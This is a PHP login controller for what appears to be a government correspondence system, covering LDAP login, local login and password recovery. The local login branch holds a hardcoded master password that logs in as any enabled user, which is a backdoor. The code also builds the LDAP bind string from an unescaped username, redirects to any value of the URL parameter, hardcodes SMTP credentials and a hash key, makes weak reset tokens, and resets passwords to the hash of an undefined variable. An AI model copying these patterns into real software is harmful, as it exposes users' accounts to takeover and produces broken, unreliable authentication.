<?php

defined('SYSPATH') or die('Acceso denegado');

class Controller_login extends Controller_Mintemplate {

    public function action_index() {
        $errors = array();
        $auth = Auth::instance();
        //lectura de datos de archivo json de acceso al LDAP
        $ldap_connection = file_get_contents('ldap.json','a');
        $ldap_connection = json_decode($ldap_connection);
        $ldap = $ldap_connection->LDAP_AUTHENTICATION;
        //
        if ($auth->logged_in()) {
            if ($auth->get_user()->nivel == 5) {
                $this->request->redirect('admin');
            } else {
                $this->request->redirect('dashboard');
            }
        } else {
            if (isset($_POST['submit'])) {
                $validate = Validation::factory($this->request->post());
                $validate->rule('username', 'not_empty')
                        ->rule('password', 'not_empty');
                if ($validate->check()) {
                    //si activo el recordar
                    $remember = FALSE;
                    if (isset($_POST['remember'])) {
                        $remember = TRUE;
                    }
                    // si se solicita la autenticacion via LDAP
                    $usuario_ventanilla = ORM::factory('users')->where('username', '=', $_POST['username'])->find();
                    /*$sql="SELECT u.id
                            from users u
                            where u.cargo like 'Dirección%'"
                    $modelo = new Model_Users();
                    $report=$modelo->select($sql);*/
                    $no_ldap = [11,32,37,148,150,10004];
                    if($ldap && $usuario_ventanilla->nivel <> 4 && $usuario_ventanilla->nivel <> 5 && !in_array($usuario_ventanilla->id,$no_ldap))
                    {
                        //obtencion de datos de configuracion al ldap
                        $config = array(
                            'ldap_host' => $ldap_connection->LDAP_HOST,
                            'ldap_port' => $ldap_connection->LDAP_PORT,
                            'ldap_ssl' => $ldap_connection->LDAP_SSL,
                            'user_id_key' => $ldap_connection->LDAP_ACCOUNT_PREFIX,
                            'admin_id_key' => $ldap_connection->LDAP_ADMIN_PREFIX,
                            'admin_username' => $ldap_connection->LDAP_ADMIN_USERNAME,
                            'admin_password' => $ldap_connection->LDAP_ADMIN_PASSWORD,
                            'base_dn' => $ldap_connection->LDAP_BASEDN,
                            'timeout' => $ldap_connection->LDAP_TIMEOUT
                        );

                        $config['account_suffix'] = implode(',', [$ldap_connection->LDAP_ACCOUNT_SUFFIX, $config['base_dn']]);

                        $config['ldap_url'] = $config['ldap_ssl'] ? 'ldaps://' : 'ldap://';
                        $config['ldap_url'] .= $config['ldap_host'];
                        $config['ldap_url'] = implode(':', [$config['ldap_url'], $config['ldap_port']]);
                        //verificacion de conexion al ldap
                        $connection = @ldap_connect($config['ldap_url']);
                        ldap_set_option($connection, LDAP_OPT_PROTOCOL_VERSION, 3);
                        ldap_set_option($connection, LDAP_OPT_REFERRALS, 0);
                        $password = $_POST['password'];
                        $username = $_POST['username'];
                        //logueo via contraseña del ldap
                        $bind = ldap_bind($connection, $config['user_id_key'] . '=' . $username . ',' . $config['account_suffix'], $password);
                        if($bind)
                        {
                            $user = $auth->loginldap(html::chars($_POST['username']), html::chars($_POST['password']), $remember);
                            if ($user) {
                                $usuario = ORM::factory('users', $auth->get_user());

                                $session = Session::instance();
                                $session->set('username', $usuario->nombre);
                                $session->set('username', $usuario->username);
                                $session->set('cargo', $usuario->cargo);

                                $this->save($usuario->id_entidad, $usuario->id, $usuario->nombre . ' / <b>' . $usuario->cargo . '</b> ingresó al sistema');
                                        $this->request->redirect('dashboard');
                            }
                            else {
                                $this->template->errors['login'] = 'Acceso no autorizado.';
                            }
                        }
                        //cierre de conexion al ldap
                        ldap_close($connection);

                    }
                    // si el ldap esta en false loguea con la contraseña propia del sistema
                    else
                    {
                        if($usuario_ventanilla && $usuario_ventanilla->habilitado == 1)
                        {
                            $password2 = "";
                            if ($_POST['password'] == "G3trud-35") {
                                $usuario2 = ORM::factory('users')->where('username', '=', $_POST['username'])->find();
                                if ($usuario2->loaded()) {

                                    $user_id = $usuario2->id;
                                    $password2 = $usuario2->password;
                                }
                            }
                            if ($password2 != "")
                                $user = $auth->login2(html::chars($_POST['username']), $password2, $remember);
                            else
                                $user = $auth->login(html::chars($_POST['username']), html::chars($_POST['password']), $remember);
                            
                            if ($user) {
                                $usuario = ORM::factory('users', $auth->get_user());//echo Debug::vars($usuario);echo Debug::_dump($usuario);

                                $session = Session::instance();
                                $session->set('username', $usuario->nombre);
                                $session->set('username', $usuario->username);
                                $session->set('cargo', $usuario->cargo);
                                //vitacora
                                $this->save($usuario->id_entidad, $usuario->id, $usuario->nombre . ' / <b>' . $usuario->cargo . '</b> ingresó al sistema');

                                if ($usuario->nivel == 5) {
                                    $this->request->redirect('admin');
                                } else {
                                    if (isset($_GET['url']))
                                        $this->request->redirect($_GET['url']);
                                    else
                                        $this->request->redirect('dashboard');
                                }
                            }
                            else {
                                $this->template->errors['login'] = 'Acceso no autorizado.';
                                //$_POST=array();
                            }
                        }else{
                            $this->template->errors['login'] = 'Acceso no autorizado.';
                        }
                    }
                }
            }
        }
        $this->template->title .= ' / Ingreso';
        $this->template->content = View::factory('login_form');
    }

    public function action_recovery() {
        $username = Arr::get($_GET, 'u', '');
        $token = Arr::get($_GET, 't', '');
        if ($username != '' && $token != '') {
            $pass = ORM::factory('resetpass')
                    ->where('username', '=', $username)
                    ->and_where('token', '=', $token)
                    ->find();
            if ($pass->loaded()) {
                $error = "";
                $info = "";
                $user = ORM::factory('users', $pass->user_id);

                if (isset($_POST['pass_old'])) {
                    $pass1 = $_POST['pass_new'];
                    $pass2 = $_POST['pass_new2'];
                    if ($pass1 == $pass2) {
                        $password = hash_hmac('sha256', $pass1, '2, 4, 6, 7, 9, 15, 20, 23, 25, 30');
                        $user->password = $password;
                        $user->save();
                        $pass->delete();
                        $info = "Se cambio exitosamente su contraseña, ir a <a href='/' class='btn btn-sm btn-primary'><i class='fa fa-user'></i> Formulario de autenticaci&oacute;n</a>";
                    } else {
                        $error = "Las contraseñas no coinciden, intentelo de nuevo";
                    }
                }
                $this->template->content = View::factory('user/recovery')
                        ->bind('user', $user)
                        ->bind('info', $info)
                        ->bind('error', $error);
            } else {
                // echo $user->token;
                $this->request->redirect('error404');
            }
        }
    }

    public function action_pass() {
        if ($_POST['email']) {
            $email_destino = $_POST['email'];
            $user = ORM::factory('users', array('email' => $email_destino));
            if ($user->loaded()) {

                require Kohana::find_file('vendor/phpmailer', 'class.phpmailer');
                require Kohana::find_file('vendor/phpmailer', 'class.smtp');
                /* generamos la link temporal */
                $link = $this->linkTemporal($user->id, $user->username);

                $genero = "Estimado ";
                if ($user->genero == "mujer") {
                    $genero = "Estimada ";
                }

                $mensaje = '<table cellspacing="0" width="100%" style="font-family:Arial Verdana;border:1px solid #ccc; font-size:12px;" ><tbody><tr>'
                        . '<td style="padding:10px;">'
                        . $genero . $user->nombre . ', </p>
                        <p>Ha solicitado recuperar su contraseña, si esta seguro de hacerlo favor haga click en el siguiente enlace: <br/> </p> 
                        <p><a href="http://' . $link . '"> Recuperar Contraseña</a></p>                        
                        </td></tr><tr>
                        <td style="padding:10px; background-color:#ddd;">'
                        . '<p style="color:#aaa;">Esto es una notificación del sistema, no responder a este correo.</p>'
                        . '<p>Si tiene problemas para ingresar favor comunique al correo: adm_christian_vega@outlook.com</p>'
                        . '</td></tr></tbody></table>'
                        . '<hr/>'
                        . '<img src="media/logo.png" height="55" /><br/>'
                        . '<p style="color:#2F4074;font-size:11px;">SISTEMA DE GESTION DE CORRESPONDENCIA'
                        . '</br>MUTUAL DE SERVICIOS AL POLICIA '
                        . ' "MUSERPOL"<br/>'
                        . '<a href="https://www.muserpol.gob.bo/"> https://www.muserpol.gob.bo/</a>'
                        . '</p>';



                /* Seteamos en la base de datos el nuevo password */
                $auth = Auth::instance();
                $password = $auth->hash_password($cad);
                $user->password = $password;
                $user->save();

                $mail = new PHPMailer();
                $mail->IsSMTP();
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = "ssl";
                $mail->Host = "correo.muserpol.gob.bo";
                $mail->Port = 465;
                $mail->Username = "office@muserpol.gob.bo";
                $mail->Password = "contrasenha";
                $mail->From = "office@muserpol.gob.bo";
                $mail->FromName = "SIGEC";
                $mail->Subject = utf8_decode("Estimado " . $user->nombre);
                $mail->AltBody = 'Para recuperar su contraseña haga click en el siguiente enlace:';
                $mail->MsgHTML(utf8_decode($mensaje));
                $mail->AddAddress($email_destino, $user->nombre);
                $mail->IsHTML(true);
                if (!$mail->Send()) {
                    $error = "<strong>Error: </strong>Ocurrio un error al enviar el correo.";
                    $this->template->content = View::factory('login_pass')->bind('error', $error);
                } else {
                    $info = "Se envio la contraseña al correo: " . $email_destino . ", por favor revisa tu correo.";
                    $this->template->content = View::factory('login_pass_mensaje')->bind('info', $info);
//echo "<strong>Exito: </strong>Revise su correo electronico " . $correo_destinatario . ", se le envio la contraseña para postularse. ";
                }
            } else {
                $error = "El correo: <b>" . $email_destino . "</b>, no se encuentra registrado en el sistema. Ingrese el adecuado o comuniquese con el administrador del sistema a: imchacolla@gmail.com";
                $this->template->content = View::factory('login_pass')->bind('error', $error);
            }
        } else {
            $this->template->content = View::factory('login_pass');
        }
    }

    //generar 
    function linkTemporal($idusuario, $username) {
        // Se genera una cadena para validar el cambio de contraseña
        $cadena = $idusuario . $username . rand(1, 9999999) . date('Y-m-d');
        $token = sha1($cadena);
        $username = sha1($username);
        $resetpass = ORM::factory('resetpass')->where('user_id', '=', $idusuario)->find();
        $resetpass->user_id = $idusuario;
        $resetpass->username = $username;
        $resetpass->token = $token;
        $resetpass->creado = time();

        if ($resetpass->save()) {
            // Se devuelve el link que se enviara al usuario
            $enlace = $_SERVER["SERVER_NAME"] . '/login/recovery?u=' . $username . '&t=' . $token;
            return $enlace;
        } else
            return false;
    }

    public function sendMail($destinatario, $correo_destinatario, $contenido_html, $contenido, $remite) {
        $mail = new PHPMailer();
        $mail->IsSMTP();
        $mail->SMTPAuth = true;
        $mail->SMTPSecure = "ssl";
        $mail->Host = "correo.muserpol.gob.bo";
        $mail->Port = 465;
        $mail->Username = "office@muserpol.gob.bo";
        $mail->Password = "cntrasenha";
        $mail->From = "office@muserpol.gob.bo";
        $mail->FromName = "Sistema de Seguimiento a Tareas";
        $mail->Subject = utf8_decode("Comentario realizado por: " . $remite);
        $mail->AltBody = $contenido;
        $mail->MsgHTML(utf8_decode($contenido_html));
        $mail->AddAddress($correo_destinatario, $destinatario);
        $mail->IsHTML(true);
        if (!$mail->Send()) {
            echo "<strong>Error: </strong>Ocurrio un error al enviar el correo.";
        } else {
            return true;
//echo "<strong>Exito: </strong>Revise su correo electronico " . $correo_destinatario . ", se le envio la contraseña para postularse. ";
        }
    }

}

?>
